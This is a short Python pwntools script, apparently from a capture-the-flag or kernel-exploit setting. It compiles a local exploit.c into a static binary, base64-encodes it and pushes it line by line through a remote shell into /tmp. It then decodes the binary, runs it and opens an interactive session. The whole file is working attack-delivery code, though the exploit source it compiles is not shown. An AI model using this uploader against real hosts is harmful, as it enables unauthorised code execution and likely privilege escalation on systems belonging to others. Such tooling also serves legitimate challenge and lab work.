#!/usr/bin/env python3

from pwn import *
from sys import argv
import time, os
context.log_level = "info"

def help():
    print("Usage: uploader.py <host> <port>")
    quit()

if len(argv) != 3:
    help()

log.info("Compiling exploit...")
os.system("gcc -S exploit.c -o exploit.S")
os.system("musl-gcc exploit.S -o exploit -static")

log.info("Compression exploit...")
os.system("tar -czvf exp.tar.gz ./exploit")

log.info("Encode base64...")
os.system("base64 exp.tar.gz > b64_exp")
f = open("./b64_exp", "r")

log.info("Sending remote server...")
p = remote(argv[1], argv[2])
p.sendline()
p.recvuntil("$")
p.sendline("cd /tmp")
p.sendline("echo '' > b64_exp;")

count = 1
while True:
    print('now line: ' + str(count))
    line = f.readline().replace("\n","")
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendline(cmd)
    p.recvuntil("$")
    count += 1
f.close()

log.info("Extract exploit...")
p.sendline("base64 -d b64_exp > exp.tar.gz;")
p.sendline("tar -xzvf exp.tar.gz")
log.info("Execute exploit...")
p.sendline("chmod +x ./exploit;")
p.sendline("./exploit")
p.interactive()
